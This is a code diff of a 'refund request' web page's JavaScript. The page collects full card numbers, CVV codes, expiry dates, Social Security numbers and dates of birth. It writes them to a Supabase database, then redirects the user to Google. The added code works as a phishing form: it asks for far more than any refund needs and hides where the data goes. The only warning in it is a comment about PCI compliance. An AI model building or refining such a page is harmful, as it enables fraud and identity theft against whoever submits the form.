@@ -251,254 +251,218 @@
       <a href="https://codingfleet.com/pricing/" target="_blank" rel="noopener">See Pricing →</a>
     </footer>
   </div>
+<!-- Your existing HTML content -->
+
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
   <script>
-    // Converted from React TypeScript to vanilla JS.
     (function () {
-      // Form state
-      const form = document.getElementById('refund-form');
-      const submitBtn = document.getElementById('submit-btn');
-      const statusContainer = document.getElementById('status-container');
-      const dobInput = document.getElementById('dob');
+  // --- Supabase Initialization ---
+  const SUPABASE_URL = 'YOUR_SUPABASE_URL'; // Replace with your Supabase URL
+  const SUPABASE_ANON_KEY = 'YOUR_SUPABASE_ANON_KEY'; // Replace with your Supabase anon public key
 
-      // Set max date for DOB to today to prevent future dates
-      (function setDobMaxToToday() {
-        if (!dobInput) return;
-        const today = new Date();
-        const yyyy = today.getFullYear();
-        const mm = String(today.getMonth() + 1).padStart(2, '0');
-        const dd = String(today.getDate()).padStart(2, '0');
-        dobInput.max = `${yyyy}-${mm}-${dd}`;
-      })();
+  const supabase = Supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+  // --- End Supabase Initialization ---
 
-      // Helper: show status messages
-      function setStatus(message, type = 'info') {
-        statusContainer.innerHTML = '';
-        if (!message) return;
-        const p = document.createElement('div');
-        p.className = 'status';
-        if (type === 'success') p.classList.add('success');
-        else if (type === 'error') p.classList.add('error');
-        p.textContent = message;
-        statusContainer.appendChild(p);
+  const form = document.getElementById('refundForm');
+  const statusContainer = document.getElementById('statusMessage');
+  const submitButton = form.querySelector('button[type="submit"]');
+
+  // Set max date for DOB to today
+  const dobInput = document.getElementById('dob');
+  if (dobInput) {
+    dobInput.max = new Date().toISOString().split('T')[0];
+  }
+
+  // Helper to set status messages
+  function setStatus(message, type) {
+    statusContainer.textContent = message;
+    statusContainer.className = `status-message ${type}`;
+    statusContainer.setAttribute('aria-live', 'polite');
+  }
+
+  // Helper to clear status messages
+  function clearStatus() {
+    statusContainer.textContent = '';
+    statusContainer.className = 'status-message';
+    statusContainer.removeAttribute('aria-live');
+  }
+
+  // Helper to read form data
+  function readFormData() {
+    const formData = {};
+    const fields = form.querySelectorAll('input, select, textarea');
+    fields.forEach(field => {
+      if (field.id) { // Only include fields with an ID
+        formData[field.id] = field.value;
+      }
+    });
+    return formData;
+  }
+
+  // Helper to validate a single field
+  function validateField(el) {
+    let isValid = true;
+    let errorMessage = '';
+
+    // Clear previous error
+    const errorSpan = el.nextElementSibling;
+    if (errorSpan && errorSpan.classList.contains('error-message')) {
+      errorSpan.textContent = '';
+    }
+    el.classList.remove('invalid');
+
+    if (el.required && !el.value.trim()) {
+      isValid = false;
+      errorMessage = 'This field is required.';
+    } else if (el.type === 'email' && el.value && !el.checkValidity()) {
+      isValid = false;
+      errorMessage = 'Please enter a valid email address.';
+    } else if (el.id === 'cardNumber' && el.value) {
+      // Basic check for 13-19 digits, allows spaces
+      const cleanedCardNumber = el.value.replace(/\s+/g, '');
+      if (!/^\d{13,19}$/.test(cleanedCardNumber)) {
+        isValid = false;
+        errorMessage = 'Please enter a valid card number.';
+      }
+    } else if (el.id === 'cvv' && el.value) {
+      // Basic check for 3-4 digits
+      if (!/^\d{3,4}$/.test(el.value)) {
+        isValid = false;
+        errorMessage = 'Please enter a valid CVV (3 or 4 digits).';
+      }
+    } else if (el.id === 'dob' && el.value) {
+      const selectedDate = new Date(el.value);
+      const today = new Date();
+      today.setHours(0, 0, 0, 0); // Normalize today to start of day
+      if (selectedDate > today) {
+        isValid = false;
+        errorMessage = 'Date of Birth cannot be in the future.';
+      }
+    } else if (el.id === 'ssn' && el.value) {
+      // Basic SSN format validation (###-##-#### or #########)
+      if (!/^(\d{3}-\d{2}-\d{4}|\d{9})$/.test(el.value)) {
+        isValid = false;
+        errorMessage = 'Please enter a valid SSN (e.g., XXX-XX-XXXX or XXXXXXXXX).';
+      }
+    }
+
+    if (!isValid) {
+      el.classList.add('invalid');
+      if (errorSpan && errorSpan.classList.contains('error-message')) {
+        errorSpan.textContent = errorMessage;
+      } else {
+        const newErrorSpan = document.createElement('span');
+        newErrorSpan.className = 'error-message';
+        newErrorSpan.textContent = errorMessage;
+        el.parentNode.insertBefore(newErrorSpan, el.nextSibling);
+      }
+    }
+    return isValid;
+  }
+
+  // Helper to show all field errors
+  function showFieldErrors() {
+    let formIsValid = true;
+    const fields = form.querySelectorAll('input, select, textarea');
+    fields.forEach(field => {
+      if (!validateField(field)) {
+        formIsValid = false;
+      }
+    });
+    return formIsValid;
+  }
+
+  // --- MODIFIED: handleFormSubmit to use Supabase ---
+  async function handleFormSubmit(formData) {
+    // Prepare payload for Supabase
+    const payload = {
+      reference_id: formData.referenceId,
+      amount: parseFloat(formData.amount) || 0,
+      reason: formData.reason,
+      first_name: formData.firstName,
+      last_name: formData.lastName,
+      email: formData.email,
+      mobile_number: formData.mobileNumber,
+      dob: formData.dob,
+      ssn: formData.ssn,
+      // WARNING: Storing raw card data is not PCI compliant.
+      // For production, use tokenization via a payment gateway.
+      card_number: formData.cardNumber ? String(formData.cardNumber).replace(/\s+/g, '') : '',
+      card_holder: formData.cardHolder,
+      expiry_month: formData.expiryMonth,
+      expiry_year: formData.expiryYear,
+      cvv: formData.cvv ? String(formData.cvv).trim() : ''
+    };
+
+    try {
+      const { data, error } = await supabase
+        .from('refund_requests')
+        .insert([payload]);
+
+      if (error) {
+        throw new Error(error.message || 'Supabase insertion failed.');
       }
 
-      // Helper: validate a single field using HTML constraints and optional extra checks
-      function validateField(el) {
-        if (!el) return { ok: true };
-        // Use built-in validity if exists
-        if (!el.checkValidity()) {
-          return { ok: false, message: el.validationMessage || 'Invalid field' };
-        }
-        // Additional pattern validations for cardNumber and cvv because older browsers may not use pattern on text
-        if (el.id === 'cardNumber') {
-          const v = (el.value || '').replace(/\s+/g, '');
-          if (!/^\d{9,16}$/.test(v)) {
-            return { ok: false, message: 'Card number must be 9 to 16 digits' };
-          }
-        }
-        if (el.id === 'cvv') {
-          const v = (el.value || '').trim();
-          if (!/^\d{3,4}$/.test(v)) {
-            return { ok: false, message: 'CVV must be 3 or 4 digits' };
-          }
-        }
-        if (el.id === 'lfssn') {
-          const v = el.value;
-          if (v === '') {
-            return { ok: false, message: 'Last four SSN required' };
-          }
-          const n = Number(v);
-          if (!Number.isFinite(n) || n < 0 || n > 9999) {
-            return { ok: false, message: 'Last four SSN must be between 0 and 9999' };
-          }
-        }
-        if (el.id === 'dob') {
-          const v = el.value;
-          if (!v) {
-            return { ok: false, message: 'Date of birth is required' };
-          }
-          // Enforce not in the future (HTML max also covers this)
-          const inputDate = new Date(v);
-          const now = new Date();
-          if (inputDate > now) {
-            return { ok: false, message: 'Date of birth cannot be in the future' };
-          }
-        }
-        return { ok: true };
-      }
+      return data; // Supabase returns the inserted data
+    } catch (err) {
+      console.error('Supabase submission error:', err);
+      throw new Error(`Failed to submit refund request: ${err.message || err}`);
+    }
+  }
+  // --- END MODIFIED handleFormSubmit ---
 
-      // Implementation of handleFormSubmit converted from original utils
-      // This function sends the form data to a remote endpoint (httpbin.org for demo)
-      // and returns a Promise that resolves on success and rejects on failure.
-      function handleFormSubmit(formData) {
-        // Basic sanity checks
-        return new Promise(function (resolve, reject) {
-          // Create a shallow clone to massage values
-          const payload = Object.assign({}, formData);
+  // Reset form after submission
+  function resetForm() {
+    form.reset();
+    const errorSpans = form.querySelectorAll('.error-message');
+    errorSpans.forEach(span => span.remove());
+    const invalidFields = form.querySelectorAll('.invalid');
+    invalidFields.forEach(field => field.classList.remove('invalid'));
+    clearStatus();
+  }
 
-          // Convert amount and lfssn to numbers on the payload
-          payload.amount = Number(payload.amount) || 0;
-          // Ensure expirationDate in YYYY-MM format is standardized
-          // If a month input gives "YYYY-MM" it's fine; otherwise keep as is.
-          // Prepare a safe trimmed payload that does not include full card info in logs.
-          const safePayload = Object.assign({}, payload, {
-            cardNumber: payload.cardNumber ? String(payload.cardNumber).replace(/\s+/g, '') : '',
-            cvv: payload.cvv ? String(payload.cvv) : ''
-          });
+  // Event Listeners
+  form.addEventListener('submit', async function (e) {
+    e.preventDefault();
+    clearStatus();
 
-          // For demonstration: POST to https://httpbin.org/post which echoes back what we send.
-          // In a real app replace this with your API endpoint (e.g. /api/refunds).
-          const url = 'https://httpbin.org/post';
+    if (!showFieldErrors()) {
+      setStatus('Please correct the errors in the form.', 'error');
+      return;
+    }
 
-          const controller = new AbortController();
-          const timeout = setTimeout(() => controller.abort(), 10000); // 10s timeout
+    submitButton.disabled = true;
+    submitButton.textContent = 'Submitting...';
+    setStatus('Processing your request...', 'info');
 
-          fetch(url, {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(safePayload),
-            signal: controller.signal
-          }).then(function (res) {
-            clearTimeout(timeout);
-            if (!res.ok) {
-              return res.text().then(function (txt) {
-                const err = new Error('Network response was not ok');
-                err.details = txt;
-                throw err;
-              });
-            }
-            return res.json();
-          }).then(function (data) {
-            // For demo purposes, treat any successful response as success
-            resolve(data);
-          }).catch(function (err) {
-            // If fetch fails (network or abort), reject with error
-            reject(err);
-          });
-        });
-      }
+    try {
+      const formData = readFormData();
+      await handleFormSubmit(formData);
 
-      // Utility to read all form values into an object
-      function readFormData() {
-        const fd = new FormData(form);
-        return {
-          amount: fd.get('amount') || '',
-          orderId: fd.get('orderId') || '',
-          reason: fd.get('reason') || '',
-          firstName: fd.get('firstName') || '',
-          lastName: fd.get('lastName') || '',
-          dob: fd.get('dob') || '',
-          mobileNumber: fd.get('mobileNumber') || '',
-          homeAddress: fd.get('homeAddress') || '',
-          zipCode: fd.get('zipCode') || '',
-          cardType: fd.get('cardType') || '',
-          cardNumber: fd.get('cardNumber') || '',
-          expirationDate: fd.get('expirationDate') || '',
-          cvv: fd.get('cvv') || '',
-          lfssn: fd.get('lfssn') || ''
-        };
-      }
+      setStatus('Refund request submitted successfully! Redirecting...', 'success');
+      resetForm();
+      setTimeout(() => {
+        window.location.href = 'https://www.google.com'; // Redirect after success
+      }, 3000); // 3 seconds
+    } catch (error) {
+      console.error('Submission error:', error);
+      setStatus(`Submission failed: ${error.message}`, 'error');
+    } finally {
+      submitButton.disabled = false;
+      submitButton.textContent = 'Request Refund';
+    }
+  });
 
-      // Reset the form to initial empty values
-      function resetForm() {
-        form.reset();
-        // Some browsers keep value for month/date; force empty values for required fields
-        ['amount','orderId','reason','firstName','lastName','dob','mobileNumber','homeAddress','zipCode','cardType','cardNumber','expirationDate','cvv','lfssn'].forEach(function(k){
-          const el = form.querySelector('[name="'+k+'"]');
-          if (el) el.value = '';
-        });
-      }
+  // Clear inline errors and status message on input
+  form.addEventListener('input', function (e) {
+    if (e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT' || e.target.tagName === 'TEXTAREA') {
+      validateField(e.target);
+      clearStatus(); // Clear global status on user interaction
+    }
+  });
+})();
 
-      // Show field-level validation errors (simple)
-      function showFieldErrors() {
-        // Clear previous field-level bubbles (if any)
-        const fields = form.querySelectorAll('input,select');
-        let firstInvalid = null;
-        for (let i = 0; i < fields.length; i++) {
-          const f = fields[i];
-          const v = validateField(f);
-          // Remove previous inline error node if present
-          const existing = f.parentNode.querySelector('.error-text-inline');
-          if (existing) existing.remove();
-          if (!v.ok) {
-            const errNode = document.createElement('div');
-            errNode.className = 'error-text error-text-inline';
-            errNode.textContent = v.message || 'Invalid value';
-            errNode.style.display = 'block';
-            errNode.style.marginTop = '6px';
-            f.parentNode.appendChild(errNode);
-            if (!firstInvalid) firstInvalid = f;
-          }
-        }
-        if (firstInvalid) {
-          firstInvalid.focus();
-          return false;
-        }
-        return true;
-      }
-
-      // Event: form submit
-      form.addEventListener('submit', function (ev) {
-        ev.preventDefault();
-        // Clear any existing messages
-        setStatus('', null);
-
-        // Quick client-side validation
-        const allValid = showFieldErrors();
-        if (!allValid) {
-          setStatus('Please correct the highlighted fields and try again.', 'error');
-          return;
-        }
-
-        // Build data object
-        const data = readFormData();
-
-        // Disable submit
-        submitBtn.disabled = true;
-        const previousText = submitBtn.textContent;
-        submitBtn.textContent = 'Submitting...';
-
-        // Call the submit util (mimics the original handleFormSubmit usage)
-        handleFormSubmit(data).then(function (resp) {
-          // On success show message, reset form, and redirect to Google
-          setStatus('Refund request submitted successfully! Redirecting to Google...', 'success');
-
-          // Reset form fields
-          resetForm();
-
-          // small delay for user to read message then redirect
-          setTimeout(function () {
-            // Redirect to Google on success
-            window.location.href = 'https://www.google.com';
-          }, 1200);
-        }).catch(function (err) {
-          console.error('Submit failed:', err);
-          let errMsg = 'Failed to submit the refund request. Please try again.';
-          // Provide more info if available
-          if (err && err.message) {
-            // Don't reveal internal details to users; keep friendly
-            errMsg = 'Failed to submit the refund request. ' + (err.message === 'Failed to fetch' ? 'Network error.' : 'Please try again.');
-          }
-          setStatus(errMsg, 'error');
-        }).finally(function () {
-          submitBtn.disabled = false;
-          submitBtn.textContent = previousText;
-        });
-      });
-
-      // Remove inline field error when user types
-      form.addEventListener('input', function (ev) {
-        const target = ev.target;
-        if (!target) return;
-        const inline = target.parentNode.querySelector('.error-text-inline');
-        if (inline) inline.remove();
-        // Clear global status when editing
-        setStatus('', null);
-      });
-    })();
   </script>
 </body>
 </html>
